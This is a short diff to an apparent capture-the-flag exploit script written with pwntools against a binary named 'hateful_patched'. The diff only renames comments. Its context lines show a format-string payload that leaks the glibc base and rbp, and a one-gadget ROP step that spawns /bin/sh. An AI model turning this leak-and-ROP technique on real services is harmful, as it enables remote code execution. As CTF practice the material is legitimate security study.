@@ -12,7 +12,7 @@ p = gdb.debug('./hateful_patched', '''
 
 # p = remote('52.59.124.14', 5020)
 
-# Stage 1: leak glibc base address and rbp value with format string
+# 1. leak glibc base address and rbp value with format string
 p.sendlineafter(b">> ", b'yay')
 p.sendlineafter(b">> ", b'%p%p%p%p%p')
 p.recvuntil(b"email provided: ")
@@ -22,7 +22,7 @@ glibc_base_addr = int(addrs[-14:], 16)-0x1d2a80
 print(f"rbp value: {hex(rbp_val)}")
 print(f"glibc base address: {hex(glibc_base_addr)}")
 
-# Stage 2: ROP with one gadget
+# 2. ROP with one gadget
 # 0xd511f execve("/bin/sh", rbp-0x40, r13)
 # constraints:
 #   address rbp-0x38 is writable
